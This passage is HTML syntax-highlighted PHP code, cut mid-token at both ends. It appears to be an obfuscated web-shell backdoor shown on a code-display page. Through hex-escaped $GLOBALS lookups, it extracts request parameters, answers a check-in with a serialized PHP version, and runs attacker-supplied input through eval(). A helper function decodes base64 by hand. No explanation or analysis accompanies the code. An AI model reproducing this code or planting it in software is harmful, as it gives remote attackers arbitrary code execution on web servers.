class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c</span><span class="s2">O</span><span class="se">\x42</span><span class="s2">A</span><span class="se">\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"q</span><span class="se">\x6c\x79</span><span class="s2">mok</span><span class="se">\x66\x7a</span><span class="s2">o</span><span class="se">\x65</span><span class="s2">"</span><span class="p">]}));</span><span class="o">@</span><span class="nb">extract</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f</span><span class="s2">BA</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6e\x76</span><span class="s2">i</span><span class="se">\x71\x70\x68\x6c</span><span class="s2">"</span><span class="p">]});</span><span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"GL</span><span class="se">\x4f\x42\x41</span><span class="s2">LS"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x66\x6b\x6d\x79\x71\x65\x78</span><span class="s2">"</span><span class="p">]})){</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f\x42</span><span class="s2">A</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6b</span><span class="s2">d</span><span class="se">\x63</span><span class="s2">cuu</span><span class="se">\x74\x6a\x63</span><span class="s2">cpn"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x72</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6b</span><span class="s2">d</span><span class="se">\x63\x63\x75\x75\x74\x6a\x63\x63</span><span class="s2">p</span><span class="se">\x6e</span><span class="s2">"</span><span class="p">]}</span><span class="o">=</span><span class="k">array</span><span class="p">();</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6a\x6b\x62\x6c\x61</span><span class="s2">l</span><span class="se">\x69</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x61</span><span class="s2">"</span><span class="p">;</span><span class="nv">$dnyyrqcjhbg</span><span class="o">=</span><span class="s2">"</span><span class="se">\x72</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42\x41\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x70\x70\x6d\x75\x79</span><span class="s2">v</span><span class="se">\x69</span><span class="s2">"</span><span class="p">]}[</span><span class="s2">"</span><span class="se">\x73</span><span class="s2">"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">118</span><span class="p">)]</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="mi">49</span><span class="p">)</span><span class="mf">.</span><span class="s2">".</span><span class="se">\x30</span><span class="s2">-3"</span><span class="p">;</span><span class="nv">$kwshfzxow</span><span class="o">=</span><span class="s2">"</span><span class="se">\x72</span><span class="s2">"</span><span class="p">;</span><span class="nv">${$dnyyrqcjhbg}</span><span class="p">[</span><span class="s2">"p"</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="mi">118</span><span class="p">)]</span><span class="o">=</span><span class="kc">PHP_VERSION</span><span class="p">;</span><span class="k">if</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"GL</span><span class="se">\x4f\x42\x41\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6a\x66</span><span class="s2">d</span><span class="se">\x75\x62\x66\x73\x79</span><span class="s2">"</span><span class="p">]})</span><span class="o">==</span><span class="mi">105</span><span class="p">)</span><span class="k">echo</span><span class="o">@</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">${$kwshfzxow}</span><span class="p">);</span><span class="k">elseif</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"j</span><span class="se">\x6b\x62</span><span class="s2">l</span><span class="se">\x61\x6c\x69</span><span class="s2">"</span><span class="p">]})</span><span class="o">==</span><span class="mi">101</span><span class="p">)</span><span class="k">eval</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">O</span><span class="se">\x42</span><span class="s2">A</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"j</span><span class="se">\x6b\x6f\x7a\x74\x6f\x67\x6b</span><span class="s2">"</span><span class="p">]});</span><span class="k">exit</span><span class="p">();}}</span><span class="k">function</span> <span class="n">get_params</span><span class="p">(</span><span class="nv">$s</span><span class="p">){</span><span class="nv">$egmozpvqw</span><span class="o">=</span><span class="s2">"c"</span><span class="p">;</span><span class="nv">$dvhtoerid</span><span class="o">=</span><span class="s2">"ba</span><span class="se">\x73\x65\x36\x34\x63</span><span class="s2">ha</span><span class="se">\x72\x73</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">OB</span><span class="se">\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x69\x61\x6b\x74\x61\x65</span><span class="s2">p</span><span class="se">\x7a\x6b</span><span class="s2">olt"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x73</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">LO</span><span class="se">\x42\x41\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x78</span><span class="s2">e</span><span class="se">\x66</span><span class="s2">u</span><span class="se">\x64\x77</span><span class="s2">e</span><span class="se">\x6b\x71\x78</span><span class="s2">r"</span><span class="p">]}</span><span class="o">=</span><span class="s2">"</span><span class="se">\x41</span><span class="s2">B</span><span class="se">\x43\x44\x45</span><span class="s2">FG</span><span class="se">\x48</span><span class="s2">I</span><span class="se">\x4a</span><span class="s2">KLMN</span><span class="se">\x4f\x50\x51\x52</span><span class="s2">S</span><span class="se">\x54\x55</span><span class="s2">V</span><span class="se">\x57</span><span class="s2">X</span><span class="se">\x59</span><span class="s2">Z</span><span class="se">\x61\x62\x63\x64</span><span class="s2">ef</span><span class="se">\x67\x68</span><span class="s2">i</span><span class="se">\x6a</span><span class="s2">kl</span><span class="se">\x6d\x6e</span><span class="s2">op</span><span class="se">\x71\x72</span><span class="s2">s</span><span class="se">\x74</span><span class="s2">u</span><span class="se">\x76</span><span class="s2">w</span><span class="se">\x78</span><span class="s2">y</span><span class="se">\x7a</span><span class="s2">012</span><span class="se">\x33</span><span class="s2">4</span><span class="se">\x35</span><span class="s2">6</span><span class="se">\x37</span><span class="s2">89+/"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f\x42</span><span class="s2">A</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x75\x64\x67</span><span class="s2">m</span><span class="se">\x6f</span><span class="s2">t</span><span class="se">\x6c</span><span class="s2">l</span><span class="se">\x72\x71</span><span class="s2">q</span><span class="se">\x79</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"r"</span><span class="p">;</span><span class="nv">$navmbtcm</span><span class="o">=</span><span class="s2">"</span><span class="se">\x70</span><span class="s2">"</span><span class="p">;</span><span class="nv">$hbzvyvtkwl</span><span class="o">=</span><span class="s2">"</span><span class="se">\x70</span><span class="s2">"</span><span class="p">;</span><span class="nv">$lksboqor</span><span class="o">=</span><span class="s2">"</span><span class="se">\x73</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42</span><span class="s2">A</span><span class="se">\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6e</span><span class="s2">cd</span><span class="se">\x67</span><span class="s2">q</span><span class="se">\x72\x75\x73\x6f</span><span class="s2">db"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x62</span><span class="s2">a</span><span class="se">\x73</span><span class="s2">e</span><span class="se">\x36</span><span class="s2">4</span><span class="se">\x69\x6e\x76</span><span class="s2">"</span><span class="p">;</span><span class="nv">$pjitegq</span><span class="o">=</span><span class="s2">"</span><span class="se">\x73</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f\x42</span><span class="s2">A</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6e\x63\x64\x67</span><span class="s2">q</span><span class="se">\x72</span><span class="s2">u</span><span class="se">\x73</span><span class="s2">od</span><span class="se">\x62</span><span class="s2">"</span><span class="p">]}</span><span class="o">=</span><span class="k">Array</span><span class="p">();</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f\x42\x41\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x61\x68\x72\x63</span><span class="s2">d</span><span class="se">\x68\x6b</span><span class="s2">lj</span><span class="se">\x63</span><span class="s2">h</span><span class="se">\x66</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"s"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42\x41</span><span class="s2">LS"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x73\x77\x7a\x6a</span><span class="s2">d</span><span class="se">\x6d</span><span class="s2">me</span><span class="se">\x6b</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"r"</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6f</span><span class="s2">i</span><span class="se">\x6d</span><span class="s2">fwpb</span><span class="se">\x76\x73</span><span class="s2">"</span><span class="p">]}</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6f\x69\x6d</span><span class="s2">f</span><span class="se">\x77\x70</span><span class="s2">bvs"</span><span class="p">]}</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">${$dvhtoerid}</span><span class="p">);</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f</span><span class="s2">B</span><span class="se">\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6f\x69\x6d\x66\x77\x70</span><span class="s2">b</span><span class="se">\x76\x73</span><span class="s2">"</span><span class="p">]}</span><span class="o">++</span><span class="p">){</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x72\x64</span><span class="s2">h</span><span class="se">\x69</span><span class="s2">i</span><span class="se">\x76</span><span class="s2">g</span><span class="se">\x72\x6d</span><span class="s2">"</span><span class="p">]}[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c</span><span class="s2">OB</span><span class="se">\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x78\x65\x66\x75</span><span class="s2">d</span><span class="se">\x77\x65\x6b\x71\x78\x72</span><span class="s2">"</span><span class="p">]}[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">LO</span><span class="se">\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6f\x69\x6d</span><span class="s2">fw</span><span class="se">\x70\x62</span><span class="s2">v</span><span class="se">\x73</span><span class="s2">"</span><span class="p">]}]]</span><span class="o">=</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42</span><span class="s2">AL</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"o</span><span class="se">\x69\x6d\x66\x77</span><span class="s2">p</span><span class="se">\x62</span><span class="s2">v</span><span class="se">\x73</span><span class="s2">"</span><span class="p">]};}</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f</span><span class="s2">B</span><span class="se">\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"s</span><span class="se">\x6a\x68</span><span class="s2">y</span><span class="se">\x77\x6e\x68</span><span class="s2">"</span><span class="p">]}</span><span class="o">=</span><span class="nb">preg_replace</span><span class="p">(</span><span class="s2">"~[^A-</span><span class="se">\x5a\x61</span><span class="s2">-z</span><span class="se">\x30</span><span class="s2">-</span><span class="se">\x39\x5c</span><span class="s2">+</span><span class="se">\x5c</span><span class="s2">/</span><span class="se">\x5c</span><span class="s2">=]</span><span class="se">\x7e</span><span class="s2">"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="nv">${$lksboqor}</span><span class="p">);</span><span class="nv">${$hbzvyvtkwl}</span><span class="o">=</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f\x42</span><span class="s2">A</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x73</span><span class="s2">j</span><span class="se">\x68</span><span class="s2">ywn</span><span class="se">\x68</span><span class="s2">"</span><span class="p">]}[</span><span class="nb">strlen</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f\x42\x41\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"a</span><span class="se">\x68</span><span class="s2">r</span><span class="se">\x63\x64</span><span class="s2">h</span><span class="se">\x6b\x6c</span><span class="s2">j</span><span class="se">\x63</span><span class="s2">h</span><span class="se">\x66</span><span class="s2">"</span><span class="p">]})</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="s2">"</span><span class="se">\x3d</span><span class="s2">"</span><span class="o">?</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42</span><span class="s2">A</span><span class="se">\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x73\x6a</span><span class="s2">h</span><span class="se">\x79\x77\x6e\x68</span><span class="s2">"</span><span class="p">]}[</span><span class="nb">strlen</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c</span><span class="s2">OB</span><span class="se">\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x73\x6a</span><span class="s2">hy</span><span class="se">\x77</span><span class="s2">n</span><span class="se">\x68</span><span class="s2">"</span><span class="p">]})</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">==</span><span class="s2">"="</span><span class="o">?</span><span class="s2">"AA"</span><span class="o">:</span><span class="s2">"</span><span class="se">\x41</span><span class="s2">"</span><span class="p">)</span><span class="o">:</span><span class="s2">""</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"GL</span><span class="se">\x4f\x42</span><span class="s2">A</span><span class="se">\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6a</span><span class="s2">i</span><span class="se">\x68\x6b</span><span class="s2">u</span><span class="se">\x6d\x79\x72\x6e</span><span class="s2">q</span><span class="se">\x63</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x72</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f</span><span class="s2">B</span><span class="se">\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x75\x64\x67\x6d\x6f</span><span class="s2">t</span><span class="se">\x6c\x6c</span><span class="s2">r</span><span class="se">\x71\x71\x79</span><span class="s2">"</span><span class="p">]}</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x73\x6a</span><span class="s2">h</span><span class="se">\x79\x77\x6e</span><span class="s2">h"</span><span class="p">]}</span><span class="o">=</span><span class="nb">substr</span><span class="p">(</span><span class="nv">${$pjitegq}</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"GL</span><span class="se">\x4f\x42\x41\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x69\x61\x6b\x74\x61\x65\x70\x7a\x6b</span><span class="s2">o</span><span class="se">\x6c</span><span class="s2">t"</span><span class="p">]})</span><span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">${$navmbtcm}</span><span class="p">))</span><span class="mf">.</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"GL</span><span class="se">\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x63</span><span class="s2">t</span><span class="se">\x78</span><span class="s2">g</span><span class="se">\x76\x71</span><span class="s2">gl</span><span class="se">\x76</span><span class="s2">o</span><span class="se">\x67</span><span class="s2">"</span><span class="p">]};</span><span class="k">for</span><span class="p">(</span><span class="nv">${$egmozpvqw}</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">OB</span><span class="se">\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x75\x64\x77</span><span class="s2">wx</span><span class="se">\x65\x69\x6e</span><span class="s2">js"</span><span class="p">]}</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">OBA</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"s</span><span class="se">\x6a\x68\x79\x77</span><span class="s2">nh"</span><span class="p">]});</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">LO</span><span class="se">\x42\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x75\x64\x77</span><span class="s2">w</span><span class="se">\x78\x65\x69\x6e</span><span class="s2">j</span><span class="se">\x73</span><span class="s2">"</span><span class="p">]}</span><span class="o">+=</span><span class="mi">4</span><span class="p">){</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">O</span><span class="se">\x42</span><span class="s2">ALS"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6a\x77</span><span class="s2">in</span><span class="se">\x71\x6d</span><span class="s2">w</span><span class="se">\x62\x63</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"s"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x61\x6e</span><span class="s2">e</span><span class="se">\x64\x71\x65\x79\x76\x62</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x6e</span><span class="s2">"</span><span class="p">;</span><span class="nv">$pwqkwj</span><span class="o">=</span><span class="s2">"</span><span class="se">\x62\x61</span><span class="s2">se</span><span class="se">\x36\x34</span><span class="s2">i</span><span class="se">\x6e\x76</span><span class="s2">"</span><span class="p">;</span><span class="nv">$fyojtix</span><span class="o">=</span><span class="s2">"n"</span><span class="p">;</span><span class="nv">$gkrhxxtopl</span><span class="o">=</span><span class="s2">"s"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"GL</span><span class="se">\x4f</span><span class="s2">B</span><span class="se">\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x74</span><span class="s2">mv</span><span class="se">\x6a\x68</span><span class="s2">k</span><span class="se">\x6c\x64</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"s"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">O</span><span class="se">\x42\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"a</span><span class="se">\x7a\x73</span><span class="s2">o</span><span class="se">\x6f\x68\x78</span><span class="s2">n</span><span class="se">\x75</span><span class="s2">wz</span><span class="se">\x76</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"c"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c</span><span class="s2">OB</span><span class="se">\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x74\x6a</span><span class="s2">l</span><span class="se">\x75\x6c\x61\x76\x69\x67\x64</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"n"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"GL</span><span class="se">\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"c</span><span class="se">\x78\x76</span><span class="s2">t</span><span class="se">\x73\x72\x63\x77\x72</span><span class="s2">"</span><span class="p">]}</span><span class="o">=</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f</span><span class="s2">BA</span><span class="se">\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x72\x64\x68</span><span class="s2">iiv</span><span class="se">\x67\x72\x6d</span><span class="s2">"</span><span class="p">]}[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f</span><span class="s2">B</span><span class="se">\x41</span><span class="s2">LS"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x73\x6a</span><span class="s2">h</span><span class="se">\x79\x77</span><span class="s2">nh"</span><span class="p">]}[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42</span><span class="s2">AL</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x61\x7a\x73</span><span class="s2">o</span><span class="se">\x6f</span><span class="s2">h</span><span class="se">\x78\x6e\x75\x77\x7a</span><span class="s2">v"</span><span class="p">]}]]</span><span class="o">&lt;&lt;</span><span class="mi">18</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f</span><span class="s2">B</span><span class="se">\x41</span><span class="s2">LS"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x72\x64</span><span class="s2">h</span><span class="se">\x69\x69</span><span class="s2">v</span><span class="se">\x67\x72\x6d</span><span class="s2">"</span><span class="p">]}[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f</span><span class="s2">BA</span><span class="se">\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"j</span><span class="se">\x77\x69\x6e\x71\x6d\x77\x62\x63</span><span class="s2">"</span><span class="p">]}[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f\x42</span><span class="s2">A</span><span class="se">\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x75\x64</span><span class="s2">w</span><span class="se">\x77</span><span class="s2">x</span><span class="se">\x65</span><span class="s2">i</span><span class="se">\x6e\x6a</span><span class="s2">s"</span><span class="p">]}</span><span class="o">+</span><span class="mi">1</span><span class="p">]]</span><span class="o">&lt;&lt;</span><span class="mi">12</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"GLO</span><span class="se">\x42\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"r</span><span class="se">\x64\x68</span><span class="s2">i</span><span class="se">\x69</span><span class="s2">v</span><span class="se">\x67</span><span class="s2">rm"</span><span class="p">]}[</span><span class="nv">${$gkrhxxtopl}</span><span class="p">[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">OB</span><span class="se">\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"ud</span><span class="se">\x77\x77</span><span class="s2">xe</span><span class="se">\x69</span><span class="s2">n</span><span class="se">\x6a</span><span class="s2">s"</span><span class="p">]}</span><span class="o">+</span><span class="mi">2</span><span class="p">]]</span><span class="o">&lt;&lt;</span><span class="mi">6</span><span class="p">)</span><span class="o">+</span><span class="nv">${$pwqkwj}</span><span class="p">[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f</span><span class="s2">B</span><span class="se">\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x74</span><span class="s2">m</span><span class="se">\x76\x6a\x68\x6b</span><span class="s2">ld"</span><span class="p">]}[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">O</span><span class="se">\x42\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"u</span><span class="se">\x64\x77</span><span class="s2">w</span><span class="se">\x78</span><span class="s2">ei</span><span class="se">\x6e</span><span class="s2">js"</span><span class="p">]}</span><span class="o">+</span><span class="mi">3</span><span class="p">]];</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f</span><span class="s2">B</span><span class="se">\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"p</span><span class="se">\x70</span><span class="s2">m</span><span class="se">\x75\x79\x76\x69</span><span class="s2">"</span><span class="p">]}</span><span class="mf">.</span><span class="o">=</span><span class="nb">chr</span><span class="p">((</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">O</span><span class="se">\x42</span><span class="s2">A</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x74\x6a\x6c</span><span class="s2">u</span><span class="se">\x6c\x61\x76\x69\x67</span><span class="s2">d"</span><span class="p">]}</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">255</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">((</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">OBA</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"a</span><span class="se">\x6e</span><span class="s2">e</span><span class="se">\x64</span><span class="s2">q</span><span class="se">\x65\x79\x76\x62</span><span class="s2">"</span><span class="p">]}</span><span class="o">&gt;&gt;</span><span 